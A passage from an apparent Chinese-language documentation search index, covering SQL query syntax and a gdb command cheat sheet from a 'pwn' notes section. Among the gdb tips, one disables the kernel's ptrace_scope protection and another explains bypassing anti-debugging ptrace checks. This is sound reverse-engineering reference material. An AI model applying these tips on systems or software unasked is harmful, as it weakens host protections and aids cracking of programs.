table_name; \uff088\uff09GROUP BY \u8bed\u53e5\u7528\u4e8e\u7ed3\u5408\u805a\u5408\u51fd\u6570\uff0c\u6839\u636e\u4e00\u4e2a\u6216\u591a\u4e2a\u5217\u5bf9\u7ed3\u679c\u96c6\u8fdb\u884c\u5206\u7ec4\uff1b SELECT column_name, aggregate_function(column_name) FROM table_name WHERE column_name operator value GROUP BY column_name; \uff089\uff09\u5728 SQL \u4e2d\u589e\u52a0 HAVING \u5b50\u53e5\u539f\u56e0\u662f\uff0cWHERE \u5173\u952e\u5b57\u65e0\u6cd5\u4e0e\u805a\u5408\u51fd\u6570\u4e00\u8d77\u4f7f\u7528\uff0cHAVING \u5b50\u53e5\u53ef\u4ee5\u8ba9\u6211\u4eec\u7b5b\u9009\u5206\u7ec4\u540e\u7684\u5404\u7ec4\u6570\u636e\uff1b SELECT column_name, aggregate_function(column_name) FROM table_name WHERE column_name operator value GROUP BY column_name HAVING aggregate_function(column_name) operator value; -- \u5b9e\u4f8b SELECT Websites.name, Websites.url, SUM(access_log.count) AS nums FROM (access_log INNER JOIN Websites ON access_log.site_id=Websites.id) GROUP BY Websites.name HAVING SUM(access_log.count) > 200; \uff0810\uff09EXISTS \u8fd0\u7b97\u7b26\u7528\u4e8e\u5224\u65ad\u67e5\u8be2\u5b50\u53e5\u662f\u5426\u6709\u8bb0\u5f55\uff0c\u5982\u679c\u6709\u4e00\u6761\u6216\u591a\u6761\u8bb0\u5f55\u5b58\u5728\u8fd4\u56de True\uff0c\u5426\u5219\u8fd4\u56de False\uff1b SELECT column_name(s) FROM table_name WHERE EXISTS (SELECT column_name FROM table_name WHERE condition); -- EXISTS \u53ef\u4ee5\u4e0e NOT \u4e00\u540c\u4f7f\u7528\uff0c\u67e5\u627e\u51fa\u4e0d\u7b26\u5408\u67e5\u8be2\u8bed\u53e5\u7684\u8bb0\u5f55 SELECT Websites.name, Websites.url FROM Websites WHERE NOT EXISTS (SELECT count FROM access_log WHERE Websites.id = access_log.site_id AND count > 200);","title":"3\u3001Aggregate"},{"location":"RelatedKnowledge/ProgramLanguage/SQL/#4scalar","text":"SQL Scalar \u51fd\u6570\u57fa\u4e8e\u8f93\u5165\u503c\uff0c\u8fd4\u56de\u4e00\u4e2a\u5355\u4e00\u7684\u503c\uff1b \uff081\uff09UCASE() \u51fd\u6570\u628a\u5b57\u6bb5\u7684\u503c\u8f6c\u6362\u4e3a\u5927\u5199\uff1b SELECT UCASE(column_name) FROM table_name; -- SQL Server SELECT UPPER(column_name) FROM table_name; \uff082\uff09LCASE() \u51fd\u6570\u628a\u5b57\u6bb5\u7684\u503c\u8f6c\u6362\u4e3a\u5c0f\u5199\uff1b SELECT LCASE(column_name) FROM table_name; -- \u7528\u4e8e SQL Server \u7684\u8bed\u6cd5 SELECT LOWER(column_name) FROM table_name; \uff083\uff09MID() \u51fd\u6570\u7528\u4e8e\u4ece\u6587\u672c\u5b57\u6bb5\u4e2d\u63d0\u53d6\u5b57\u7b26\uff1b SELECT MID(column_name,start[,length]) FROM table_name; /* column_name \u5fc5\u9700\u3002\u8981\u63d0\u53d6\u5b57\u7b26\u7684\u5b57\u6bb5\u3002 start \u5fc5\u9700\u3002\u89c4\u5b9a\u5f00\u59cb\u4f4d\u7f6e\uff08\u8d77\u59cb\u503c\u662f 1\uff09\u3002 length \u53ef\u9009\u3002\u8981\u8fd4\u56de\u7684\u5b57\u7b26\u6570\u3002\u5982\u679c\u7701\u7565\uff0c\u5219 MID() \u51fd\u6570\u8fd4\u56de\u5269\u4f59\u6587\u672c\u3002 */ -- Oracle select substr((\"\u5217\u540d\"\uff0ca,b) from <table_name>; \uff084\uff09LEN() \u51fd\u6570\u8fd4\u56de\u6587\u672c\u5b57\u6bb5\u4e2d\u503c\u7684\u957f\u5ea6\uff1b SELECT LEN(column_name) FROM table_name; -- MySQL SELECT LENGTH(column_name) FROM table_name; \uff085\uff09ROUND() \u51fd\u6570\u7528\u4e8e\u628a\u6570\u503c\u5b57\u6bb5\u820d\u5165\u4e3a\u6307\u5b9a\u7684\u5c0f\u6570\u4f4d\u6570\uff1b SELECT ROUND(column_name,decimals) FROM table_name; /* column_name \u5fc5\u9700\u3002\u8981\u820d\u5165\u7684\u5b57\u6bb5\u3002 decimals \u5fc5\u9700\u3002\u89c4\u5b9a\u8981\u8fd4\u56de\u7684\u5c0f\u6570\u4f4d\u6570\u3002 */ -- ROUND(X)\uff1a \u8fd4\u56de\u53c2\u6570X\u7684\u56db\u820d\u4e94\u5165\u7684\u4e00\u4e2a\u6574\u6570 -- ROUND(X,D)\uff1a \u8fd4\u56de\u53c2\u6570X\u7684\u56db\u820d\u4e94\u5165\u7684\u6709 D \u4f4d\u5c0f\u6570\u7684\u4e00\u4e2a\u6570\u5b57\u3002\u5982\u679cD\u4e3a0\uff0c\u7ed3\u679c\u5c06\u6ca1\u6709\u5c0f\u6570\u70b9\u6216\u5c0f\u6570\u90e8\u5206\u3002 -- ROUND \u8fd4\u56de\u503c\u88ab\u53d8\u6362\u4e3a\u4e00\u4e2aBIGINT \uff086\uff09FORMAT() \u51fd\u6570\u7528\u4e8e\u5bf9\u5b57\u6bb5\u7684\u663e\u793a\u8fdb\u884c\u683c\u5f0f\u5316\uff1b SELECT FORMAT(column_name,format) FROM table_name; /* column_name \u5fc5\u9700\u3002\u8981\u683c\u5f0f\u5316\u7684\u5b57\u6bb5\u3002 format \u5fc5\u9700\u3002\u89c4\u5b9a\u683c\u5f0f\u3002 */","title":"4\u3001Scalar"},{"location":"RelatedKnowledge/pwn/gdb/","text":"gdb \u4e00\u3001\u5b89\u88c5 sudo apt-get install gdb // \u9700\u8981\u8c03\u8bd5\u5176\u4ed6\u67b6\u6784\u4e0b\u7684elf\u7a0b\u5e8f\u65f6 sudo apt-get install gdb-multiarch \u8fd8\u53ef\u4ee5\u4ecegithub\u4e0a\u4e0b\u8f7d\u4e00\u4e9b\u63d2\u4ef6\uff0cpeda\u3001gef\u3001pwndbg\u3002 \u4e8c\u3001\u5e38\u7528\u547d\u4ee4 gdb program -q // \u5b89\u9759\u6a21\u5f0f\u8c03\u8bd5\u7a0b\u5e8f quit // \u9000\u51fa\u8c03\u8bd5\u5668 run(r) arguments // \u8fd0\u884c\u88ab\u8c03\u8bd5\u7a0b\u5e8f\uff0c\u5e26\u53c2\u6570 attach pid // \u8c03\u8bd5\u8fdb\u7a0b\u53f7\u4e3apid\u7684\u8fdb\u7a0b detach // \u8131\u79bb\u8fdb\u7a0b break(b) *address // \u4e0b\u65ad\u70b9 b function_name // \u5728\u51fd\u6570\u5904\u4e0b\u65ad\u70b9 tbreak // \u8bbe\u7f6e\u4e34\u65f6\u65ad\u70b9\uff0c\u7b2c\u4e00\u6b21\u547d\u4e2d\u540e\u4f1a\u81ea\u52a8\u5220\u9664\uff0c\u7528\u6cd5\u540cbreak break \u2026 if cond // \u8bbe\u7f6e\u6761\u4ef6\u65ad\u70b9 watch(wa) v // \u8bbe\u7f6e\u89c2\u5bdf\u70b9\uff0c\u5982\u679c\u7a0b\u5e8f\u4e2d\u7684\u53d8\u91cfv\u6539\u53d8\uff0c\u7a0b\u5e8f\u5c06\u4e2d\u65ad watch *(data type*)address // \u5982\u679c\u5185\u5b58\u5730\u5740address\u5904\u6539\u53d8\uff0c\u7a0b\u5e8f\u5c06\u4e2d\u65ad watch expr thread threadnum // \u53ea\u89c2\u5bdf\u5bf9\u5e94\u7ebf\u7a0b\u7684\u53d8\u91cf\u503c\u53d8\u5316\uff0c\u5982\u679c\u53d8\u5316\u7a0b\u5e8f\u4e2d\u65ad rwatch(rw) // \u8bbe\u7f6e\u8bfb\u89c2\u5bdf\u70b9\uff0c\u5982\u679c\u7a0b\u5e8f\u4e2d\u7684\u53d8\u91cf\u6216\u8005\u5185\u5b58\u88ab\u8bfb\u53d6\uff0c\u7a0b\u5e8f\u5c06\u4e2d\u65ad awatch(aw) // \u8bbe\u7f6e\u8bfb\u5199\u89c2\u5bdf\u70b9\uff0c\u5982\u679c\u53d8\u91cf\u6216\u8005\u5730\u5740\u88ab\u8bfb\u53d6\u6216\u8005\u6539\u53d8\uff0c\u7a0b\u5e8f\u5c06\u4e2d\u65ad catch fork/vfork/exec // \u4e3afork\u3001vfork\u3001exec\u51fd\u6570\u8bbe\u5b9acatchpoint\uff0c\u9047\u5230\u8fd9\u4e9b\u51fd\u6570\u65f6\u7a0b\u5e8f\u5c06\u6682\u505c catch syscall name|num // \u5f53\u53d1\u751f\u5bf9\u5e94name\u6216num\u7cfb\u7edf\u8c03\u7528\u65f6\uff0c\u7a0b\u5e8f\u6682\u505c ignore bnum count // \u5ffd\u7565\u65ad\u70b9\uff0cbnum\u4e3a\u65ad\u70b9\u7f16\u53f7\uff0ccount\u8868\u793a\u4e4b\u540ecount\u6b21\u89e6\u53d1\u65ad\u70b9\u90fd\u5c06\u5ffd\u7565 info b // \u67e5\u770b\u65ad\u70b9 info display // \u6253\u5370\u81ea\u52a8\u663e\u793a\u7684\u8868\u8fbe\u5f0f\u5217\u8868 info threads // \u6253\u5370\u51fa\u6240\u6709\u7ebf\u7a0b\u7684\u4fe1\u606f info frame // \u6253\u5370\u51fa\u6307\u5b9a\u6808\u5e27\u7684\u8be6\u7ec6\u4fe1\u606f info proc // \u67e5\u770bproc\u91cc\u7684\u8fdb\u7a0b\u4fe1\u606f info functions // \u5217\u51fa\u53ef\u6267\u884c\u6587\u4ef6\u7684\u6240\u6709\u51fd\u6570\u540d info proc mappings // \u67e5\u770b\u8fdb\u7a0b\u7684\u5185\u5b58\u6620\u5c04\u4fe1\u606f info files/target // \u66f4\u8be6\u7ec6\u5730\u8f93\u51fa\u8fdb\u7a0b\u7684\u5185\u5b58\u4fe1\u606f\uff0c\u5305\u62ec\u5f15\u7528\u7684\u52a8\u6001\u94fe\u63a5\u5e93\u7b49\u7b49 delete number // \u5220\u9664\u67d0\u4e2a\u65ad\u70b9 stepi(si) // \u5355\u6b65\u6b65\u5165 nexti(ni) // \u5355\u6b65\u6b65\u8fc7 continue(c) // \u7ee7\u7eed\u6267\u884c finish // \u6267\u884c\u5230\u51fd\u6570\u8fd4\u56de\u5904 info register // \u67e5\u770b\u5bc4\u5b58\u5668 i all-registers // \u67e5\u770b\u6240\u6709\u5bc4\u5b58\u5668 backtrace(bt) // \u6253\u5370\u51fd\u6570\u8c03\u7528\u6808\u56de\u6eaf print(p) /x expr/file::v // \u8ba1\u7b97\u8868\u8fbe\u5f0fexpr\u7684\u503c\u5e76\u6253\u5370\uff0c\u6253\u5370file\u6587\u4ef6\u7684\u53d8\u91cf\u503c\uff0c\u683c\u5f0f\u4e3ao\uff08\u516b\u8fdb\u5236\uff09\u3001d\uff08\u5341\u8fdb\u5236\uff09\u3001x\uff08\u5341\u516d\u8fdb\u5236\uff09\u3001u\uff08\u65e0\u7b26\u53f7\u5341\u516d\u8fdb\u5236\uff09\u3001t\uff08\u4e8c\u8fdb\u5236\uff09\u3001f\uff08\u6d6e\u70b9\u6570\uff09\u3001a\uff08\u5730\u5740\uff09\u3001c\uff08\u5b57\u7b26\uff09 x/CountFormatSize address // \u4ee5\u6307\u5b9a\u683c\u5f0fFormat\u6253\u5370address\u5904\u6307\u5b9a\u5927\u5c0fSize\u3001\u6307\u5b9a\u6570\u91cfCount\u7684\u5bf9\u8c61\uff0cSize\u53d6\u503c\uff0cb\uff08\u5b57\u8282\uff09\u3001h\uff08\u534a\u5b57\uff09\u3001w\uff08\u5b57\uff09\u3001g\uff088\u5b57\u8282\uff09\uff0cFormat\u53d6\u503c\uff0co\uff08\u516b\u8fdb\u5236\uff09\u3001d\uff08\u5341\u8fdb\u5236\uff09\u3001x\uff08\u5341\u516d\u8fdb\u5236\uff09\u3001u\uff08\u65e0\u7b26\u53f7\u5341\u8fdb\u5236\uff09\u3001t\uff08\u4e8c\u8fdb\u5236\uff09\u3001f\uff08\u6d6e\u70b9\u6570\uff09\u3001a\uff08\u5730\u5740\uff09\u3001i\uff08\u6307\u4ee4\uff09\u3001c\uff08\u5b57\u7b26\uff09\u3001s\uff08\u5b57\u7b26\u4e32\uff09 display/fmt expr/addr // \u6bcf\u6b21\u7a0b\u5e8f\u505c\u6b62\u65f6\u6253\u5370\u8868\u8fbe\u5f0f\u7684\u503c\uff0c\u683c\u5f0f\u4e3ao\uff08\u516b\u8fdb\u5236\uff09\u3001d\uff08\u5341\u8fdb\u5236\uff09\u3001x\uff08\u5341\u516d\u8fdb\u5236\uff09\u3001u\uff08\u65e0\u7b26\u53f7\u5341\u516d\u8fdb\u5236\uff09\u3001t\uff08\u4e8c\u8fdb\u5236\uff09\u3001f\uff08\u6d6e\u70b9\u6570\uff09\u3001a\uff08\u5730\u5740\uff09\u3001c\uff08\u5b57\u7b26\uff09 disassemble(disas) // \u53cd\u6c47\u7f16\u4ee3\u7801 set $reg=value // \u4fee\u6539\u5bc4\u5b58\u5668\u7684\u503c set {type}(address)=value // \u4fee\u6539\u5185\u5b58\u5730\u5740address\u5904\u7684\u503c\u4e3avalue\uff0c\u7c7b\u578b\u4e3atype\u6307\u5b9a\uff0c\u4f8b\u5982int set var variable=expr // \u4fee\u6539\u4ee3\u7801\u4e2d\u7684\u53d8\u91cf\u503c shell command // \u6267\u884cshell\u547d\u4ee4 set follow-fork-mode parent|child // \u5f53\u53d1\u751ffork\u65f6\uff0c\u6307\u793a\u8c03\u8bd5\u5668\u8ddf\u8e2a\u7236\u8fdb\u7a0b\u8fd8\u662f\u5b50\u8fdb\u7a0b handler SIGALRM ignore // \u5ffd\u89c6SIGALRM\uff0c\u8c03\u8bd5\u5668\u63a5\u6536\u5230\u7684SIGALRM\u4fe1\u53f7\u4e0d\u4f1a\u53d1\u9001\u5230\u88ab\u8c03\u8bd5\u7a0b\u5e8f target remote ip:port // \u8fde\u63a5\u8fdc\u7a0b\u8c03\u8bd5 thread apply all bt // \u6253\u5370\u51fa\u6240\u6709\u7ebf\u7a0b\u7684\u5806\u6808\u4fe1\u606f generate-core-file(gcore) // \u5c06\u8c03\u8bd5\u4e2d\u7684\u8fdb\u7a0b\u751f\u6210\u5185\u6838\u8f6c\u50a8\u6587\u4ef6 maint info program-spaces // \u6253\u5370\u5f53\u524d\u6240\u6709\u88ab\u8c03\u8bd5\u7684\u8fdb\u7a0b\u4fe1\u606f i signals/handle // \u67e5\u770b\u5982\u4f55\u5904\u7406\u8fdb\u7a0b\u6536\u5230\u7684\u4fe1\u53f7 handle signal stop/nostop // \u8bbe\u7f6e\u4fe1\u53f7\u53d1\u751f\u65f6\u662f\u5426\u6682\u505c\u7a0b\u5e8f handle signal print/noprint // \u8bbe\u7f6e\u4fe1\u53f7\u53d1\u751f\u65f6\u662f\u5426\u6253\u5370\u4fe1\u53f7\u4fe1\u606f handle signal pass(noignore)/nopass(ignore) // \u8bbe\u7f6e\u4fe1\u53f7\u53d1\u751f\u65f6\u662f\u5426\u628a\u4fe1\u53f7\u4e22\u7ed9\u7a0b\u5e8f\u5904\u7406 \u4e09\u3001\u6280\u5de7 \uff081\uff09\u6709\u65f6\u5019attach\u5230\u4e00\u4e2a\u8fdb\u7a0b\u65f6\u53ef\u80fd\u4f1a\u51fa\u73b0\u62a5\u9519 ptrace: Operation not permitted. \uff0c\u8fd9\u662f\u56e0\u4e3a\u5f00\u542f\u4e86\u5185\u6838\u53c2\u6570 ptrace_scope \uff0c\u901a\u8fc7\u67e5\u770b cat /proc/sys/kernel/yama/ptrace_scope \uff0c\u5982\u679c\u8fd4\u56de\u503c\u4e3a1\u8868\u793a\u5f00\u542f\u4e86\uff0c\u6b64\u65f6\u666e\u901a\u7528\u6237\u8fdb\u7a0b\u662f\u65e0\u6cd5\u5bf9\u5176\u4ed6\u8fdb\u7a0b\u8fdb\u884cattach\u64cd\u4f5c\u7684\uff0c\u89e3\u51b3\u529e\u6cd5\u6709\u4e24\u4e2a\uff0c\u4e00\u4e2a\u662f\u4f7f\u7528root\u7528\u6237\uff0c\u53e6\u4e00\u4e2a\u662f\u5173\u95ed\uff0c\u4f7f\u7528\u547d\u4ee4 echo 0 > /proc/sys/kernel/yama/ptrace_scope \u5373\u53ef\uff1b \uff082\uff09\u5e26\u6e90\u7801\u8c03\u8bd5\u65b9\u6cd5\uff0c\u4f7f\u7528gcc\u7f16\u8bd1\u65f6\u5fc5\u987b\u52a0\u4e0a-g\u53c2\u6570\uff0c\u4f8b\u5982 gcc -g test.c -o test \uff0c\u7136\u540e\u5c31\u53ef\u4ee5\u4f7f\u7528 b \u884c\u53f7 \u6765\u4e0b\u65ad\u70b9\uff0c\u4f7f\u7528 list \u5f00\u59cb\u884c\u53f7,\u7ed3\u675f\u884c\u53f7 \u6765\u67e5\u770b\u6e90\u7801\uff0c\u6216\u8005\u76f4\u63a5 list \u67e5\u770b\u5f53\u524d\u6267\u884c\u4f4d\u7f6e\u540e10\u884c\u6e90\u7801\uff1b \uff083\uff09\u8fdb\u5165\u4e0d\u5e26\u8c03\u8bd5\u4fe1\u606f\u7684\u51fd\u6570\uff0c\u6709\u65f6\u5019\u8c03\u8bd5\u65f6\u65e0\u6cd5s\u8fdb\u4e0d\u5e26\u8c03\u8bd5\u4fe1\u606f\u7684\u51fd\u6570\uff0c\u6bd4\u5982printf\uff0c\u4f7f\u7528\u547d\u4ee4 set step-mode on \uff0c\u5373\u53efs\u8fdb\u5165\u4e0d\u5e26\u8c03\u8bd5\u4fe1\u606f\u7684\u51fd\u6570\u4e2d\uff1b \uff084\uff09\u9000\u51fa\u6b63\u5728\u8c03\u8bd5\u7684\u51fd\u6570\uff0c\u4e00\u79cd\u662f\u4f7f\u7528finish\uff0c\u8fd9\u6837\u662f\u6267\u884c\u5b8c\u8be5\u51fd\u6570\u5e76\u4e14\u4f1a\u6253\u5370\u8fd4\u56de\u503c\uff0c\u4e5f\u53ef\u4ee5\u4f7f\u7528return\u547d\u4ee4\uff0c\u8fd9\u6837\u51fd\u6570\u5c31\u4e0d\u4f1a\u7ee7\u7eed\u6267\u884c\u4e0b\u53bb\uff0c\u800c\u662f\u8df3\u8fc7\u5f53\u524d\u51fd\u6570\uff0c\u76f4\u63a5\u5230\u8fd4\u56de\u7684\u4f4d\u7f6e\uff0c\u53ef\u4ee5\u5e26\u8fd4\u56de\u503c return expr \uff0c\u8fd9\u6837\u5c31\u76f4\u63a5\u6307\u5b9a\u4e86\u51fd\u6570\u8fd4\u56de\u503c\uff0c\u5728\u8c03\u8bd5\u7684\u65f6\u5019\u6bd4\u8f83\u6709\u7528\uff1b \uff085\uff09\u53ef\u4ee5\u4f7f\u7528 call func \u6216 print func \u76f4\u63a5\u8c03\u7528\u51fd\u6570\u6267\u884c\uff1b \uff086\uff09\u53ef\u4ee5\u4f7f\u7528 frame n \u5207\u6362\u5806\u6808\u5e27\u5c42\u7ea7\uff0c\u4f7f\u7528 up n \u5411\u4e0a\u5207\u6362n\u5c42\u5806\u6808\u5e27\uff0c\u4f7f\u7528 down n \u5411\u4e0b\u5207\u6362n\u5c42\u5806\u6808\u5e27\uff1b \uff087\uff09\u5bf9\u4e8e\u6ca1\u6709\u8c03\u8bd5\u4fe1\u606f\u7684\u7a0b\u5e8f\uff0c\u5982\u679c\u4e0d\u77e5\u9053main\u51fd\u6570\u7684\u4f4d\u7f6e\uff0c\u53ef\u4ee5\u5728\u7a0b\u5e8f\u5165\u53e3\u5904\u6253\u65ad\u70b9\uff0c\u5148\u901a\u8fc7 readelf \u83b7\u5f97\u7a0b\u5e8f\u5165\u53e3\u5730\u5740\uff0c\u7136\u540e\u4e0b\u5730\u5740\u65ad\u70b9\u5373\u53ef\uff1b \uff088\uff09\u4fdd\u5b58\u5df2\u7ecf\u8bbe\u7f6e\u7684\u65ad\u70b9\uff0c\u5f53\u8bbe\u7f6e\u65ad\u70b9\u8f83\u591a\u5e76\u4e14\u4e0d\u4f1a\u6539\u53d8\u592a\u5927\u65f6\uff0c\u53ef\u4ee5\u4f7f\u7528\u547d\u4ee4 save breakpoints file-name-to-save \u5c06\u65ad\u70b9\u4fe1\u606f\u4fdd\u5b58\u5728\u6587\u4ef6\u4e2d\uff0c\u4e0b\u6b21\u8c03\u8bd5\u65f6\uff0c\u4f7f\u7528\u5982\u4e0b\u547d\u4ee4\u6279\u91cf\u8bbe\u7f6e\u4fdd\u5b58\u7684\u65ad\u70b9\uff0c source file-name-to-save \uff1b \uff089\uff09\u6709\u4e9b\u7a0b\u5e8f\u4e0d\u60f3\u88abgdb\u8c03\u8bd5\uff0c\u5b83\u4eec\u5c31\u4f1a\u5728\u7a0b\u5e8f\u4e2d\u8c03\u7528\u201c ptrace \u201d\u51fd\u6570\uff0c\u4e00\u65e6\u8fd4\u56de\u5931\u8d25\uff0c\u5c31\u8bc1\u660e\u7a0b\u5e8f\u6b63\u5728\u88ab gdb\u7b49\u7c7b\u4f3c\u7684\u7a0b\u5e8f\u8ffd\u8e2a\uff0c\u6240\u4ee5\u5c31\u76f4\u63a5\u9000\u51fa\uff0c\u7834\u89e3\u8fd9\u7c7b\u7a0b\u5e8f\u7684\u529e\u6cd5\u5c31\u662f\u4e3a ptrace \u8c03\u7528\u8bbe\u7f6e catchpoint \uff0c\u901a\u8fc7\u4fee\u6539 ptrace \u7684\u8fd4\u56de\u503c\uff0c\u8fbe\u5230\u76ee\u7684\uff1b \uff0810\uff09gdb\u6253\u5370\u6570\u7ec4\u7684\u9ed8\u8ba4\u957f\u5ea6\u4e3a200\u4e2a\uff0c\u5f53\u9700\u8981\u6253\u5370\u662f\u6570\u7ec4\u8f83\u5927\u65f6\u53ef\u4ee5\u4f7f\u7528 set print elements number-of-elements \u8bbe\u7f6e\u6700\u5927\u957f\u5ea6\uff0c\u6216\u8005 set print elements 0 \u8bbe\u7f6e\u6ca1\u6709\u6700\u5927\u9650\u5236\uff0c\u6216\u8005 set print elements unlimited \u8bbe\u7f6e\u6ca1\u6709\u6700\u5927\u9650\u5236\uff1b \uff0811\uff09\u6253\u5370\u6570\u7ec4\u4e2d\u4efb\u610f\u8fde\u7eed\u5143\u7d20\u7684\u503c\uff0c\u4f7f\u7528 p array[index]@num \uff0cindex\u4e3a\u6570\u7ec4\u7d22\u5f15\uff0c\u8868\u793a\u6253\u5370\u5f00\u59cb\u5904\uff0cnum\u4e3a\u6253\u5370\u7684\u4e2a\u6570\uff1b \uff0812\uff09\u9ed8\u8ba4\u4e0d\u6253\u5370\u6570\u7ec4\u7684\u7d22\u5f15\u4e0b\u6807\uff0c\u53ef\u4ee5\u8bbe\u7f6e set print array-indexes on \u6253\u5370\u7d22\u5f15\u4e0b\u6807\uff1b \uff0813\uff09\u6253\u5370\u5c40\u90e8\u53d8\u91cf\uff0c\u4e00\u4e2a\u662f\u4f7f\u7528 bt full \uff0c\u6253\u5370\u6240\u6709\u5c40\u90e8\u53d8\u91cf\u7684\u503c\uff0c\u53e6\u4e00\u4e2a\u662f\u4f7f\u7528 info locals \uff0c\u6253\u5370\u5f53\u524d\u51fd\u6570\u7684\u5c40\u90e8\u53d8\u91cf\uff1b \uff0814\uff09\u67e5\u770b\u53d8\u91cf\u7c7b\u578b\uff0c\u4f7f\u7528 whatis v \uff0c\u67e5\u770b\u8be6\u7ec6\u53d8\u91cf\u7c7b\u578b\u4fe1\u606f\u4f7f\u7528 ptype v \uff1b \uff0815\uff09\u9ed8\u8ba4\u60c5\u51b5\u6253\u5370\u7ed3\u6784\u4f53\u6bd4\u8f83\u6df7\u4e71\uff0c\u53ef\u4ee5\u8bbe\u7f6e set print pretty on \uff0c\u5c31\u80fd\u5206\u884c\u663e\u793a\u7ed3\u6784\u4f53\u6bcf\u4e00\u4e2a\u53d8\u91cf\uff1b \uff0816\uff09\u6253\u5370\u5bf9\u8c61\u65f6\uff0c\u53ef\u4ee5\u4f7f\u7528 set print object on \uff0c\u6309\u7167\u6d3e\u751f\u7c7b\u578b\u6253\u5370\u5bf9\u8c61\uff1b \uff0817\uff09\u6307\u5b9a\u7a0b\u5e8f\u7684\u8f93\u5165\u8f93\u51fa\u8bbe\u5907\uff0c\u5148\u6253\u5f00\u4e00\u4e2a\u7ec8\u7aef\uff0c\u4f7f\u7528 tty \u547d\u4ee4\u67e5\u770b\u7ec8\u7aef\u53f7\uff0c\u7136\u540e\u4f7f\u7528\u547d\u4ee4\u6307\u5b9a\u8f93\u5165\u8f93\u51fa\u8bbe\u5907 gdb -tty /dev/pts/2 ./a.out \uff0c\u6216\u8005\u5728gdb\u547d\u4ee4\u884c\u4e0b\u4f7f\u7528 tty /dev/pts/2 \uff0c /dev/pts/2 \u4e3a\u5bf9\u5e94\u7ec8\u7aef\u8bbe\u5907\u53f7\uff1b \uff0818\uff09\" x \"\u547d\u4ee4\u4f1a\u628a\u6700\u540e\u68c0\u67e5\u7684\u5185\u5b58\u5730\u5740\u503c\u5b58\u5728\u201c $_ \u201d\u8fd9\u4e2a\u53d8\u91cf\u4e2d\uff0c\u5e76\u4e14\u4f1a\u628a\u8fd9\u4e2a\u5730\u5740\u4e2d\u7684\u5185\u5bb9\u653e\u5728\u201c $__ \u201d\u8fd9\u4e2a\u53d8\u91cf\u4e2d\uff0c\u6709\u4e9b\u9690\u5f0f\u8c03\u7528\u201c x \u201d\u547d\u4ee4\u7684\u547d\u4ee4\u4e5f\u4f1a\u51fa\u73b0\u8fd9\u79cd\u60c5\u51b5\uff0c\u6bd4\u5982info line\u6216info b\uff0c\u4f7f\u7528p $_\u548cp $__\u5c31\u53ef\u4ee5\u6253\u5370\u4e24\u4e2a\u503c\uff1b \uff0819\uff09\u5982\u679c\u9700\u8981\u540c\u65f6\u8c03\u8bd5\u7236\u5b50\u8fdb\u7a0b\uff0c\u53ef\u4ee5\u8bbe\u7f6e set detach-on-fork off \uff0c\u8fd9\u6837gdb\u5c31\u80fd\u540c\u65f6\u8c03\u8bd5\u7236\u5b50\u8fdb\u7a0b\uff0c\u5e76\u4e14\u5728\u8c03\u8bd5\u4e00\u4e2a\u8fdb\u7a0b\u65f6\uff0c\u53e6\u5916\u4e00\u4e2a\u8fdb\u7a0b\u5904\u4e8e\u6302\u8d77\u72b6\u6001\uff0c\u5982\u679c\u60f3\u8ba9\u7236\u5b50\u8fdb\u7a0b\u90fd\u540c\u65f6\u8fd0\u884c\uff0c\u53ef\u4ee5\u4f7f\u7528 set schedule-multiple on \uff1b \uff0820\uff09\u53ea\u5141\u8bb8\u4e00\u4e2a\u7ebf\u7a0b\u8fd0\u884c\uff0c\u8bbe\u7f6e set scheduler-locking on \uff1b \uff0821\uff09$_thread\u53d8\u91cf\u4fdd\u5b58\u5f53\u524d\u6b63\u5728\u8c03\u8bd5\u7684\u7ebf\u7a0b\u53f7\uff1b \uff0822\uff09\u4e00\u4e2a\u4f1a\u8bdd\u4e2d\u540c\u65f6\u8c03\u8bd5\u591a\u4e2a\u7a0b\u5e8f\uff0c\u9996\u5148\u8c03\u8bd5a\u7a0b\u5e8f\uff0c\u7136\u540e\u4f7f\u7528\u547d\u4ee4 add-inferior [ -copies n ] [ -exec executable ] \u52a0\u8f7d\u53e6\u4e00\u4e2a\u7a0b\u5e8f\uff0cn\u9ed8\u8ba4\u4e3a1\uff0c\u4e5f\u53ef\u4ee5\u4f7f\u7528\u547d\u4ee4 clone-inferior [ -copies n ] [ infno ] \u514b\u9686\u73b0\u6709\u7684\u7a0b\u5e8f\uff0c\u4f7f\u7528 i inferiors \uff0c\u67e5\u770b\u672c\u6b21\u4f1a\u8bdd\u6709\u591a\u5c11\u7a0b\u5e8f\uff0c\u4f7f\u7528 inferior num \u547d\u4ee4\u5207\u6362\u8fdb\u7a0b\uff1b \uff0823\uff09\u5f53\u88ab\u8c03\u8bd5\u7684\u7a0b\u5e8f\u6b63\u5e38\u9000\u51fa\u65f6\uff0cgdb\u4f1a\u4f7f\u7528 $_exitcode \u53d8\u91cf\u8bb0\u5f55\u7a0b\u5e8f\u9000\u51fa\u65f6\u7684\u201c exit code \u201d\uff1b \uff0824\uff09\u8c03\u8bd5core dump\u6587\u4ef6\uff0c\u4f7f\u7528\u547d\u4ee4 gdb path/to/the/executable path/to/the/coredump \uff0c\u4e5f\u53ef\u4ee5gdb\u8d77\u6765\u540e\u52a0\u8f7d\u7a0b\u5e8f\u548ccore\uff0c\u4f7f\u7528file\u52a0\u8f7d\u7a0b\u5e8f\uff0c\u4f7f\u7528core\u52a0\u8f7dcore dump\uff1b \uff0825\uff09\u8bbe\u7f6e\u6c47\u7f16\u6307\u4ee4\u683c\u5f0f\uff0c\u9ed8\u8ba4\u662fAT&T\u683c\u5f0f\uff0c\u4f7f\u7528 set disassembly-flavor intel \u53ef\u4ee5\u6539\u4e3aintel\u683c\u5f0f\uff0c\u4f7f\u7528att\u53ef\u4ee5\u6539\u56de\uff0c\u76ee\u524d\u201cset disassembly-flavor\u201d\u547d\u4ee4\u53ea\u80fd\u7528\u5728Intel x86\u5904\u7406\u5668\u4e0a\uff0c\u5e76\u4e14\u53d6\u503c\u53ea\u6709\u201cintel\u201d\u548c\u201catt\u201d\uff1b \uff0826\uff09 b func \u4e0e b *func \u7684\u533a\u522b\uff0c\u524d\u8005\u4f1a\u65ad\u5728\u51fd\u6570\u8d77\u5b9e\u9645\u4f5c\u7528\u7684\u7b2c\u4e00\u6761\u6c47\u7f16\u8bed\u53e5\uff0c\u800c\u540e\u8005\u4f1a\u65ad\u5728\u51fd\u6570\u7684\u7b2c\u4e00\u6761\u6c47\u7f16\u8bed\u53e5\uff1b \uff0827\uff09\u5728\u4efb\u610f\u60c5\u51b5\u4e0b\u53cd\u6c47\u7f16\u540e\u9762\u8981\u6267\u884c\u7684\u4ee3\u7801\uff0c\u8bbe\u7f6e set disassemble-next-line on 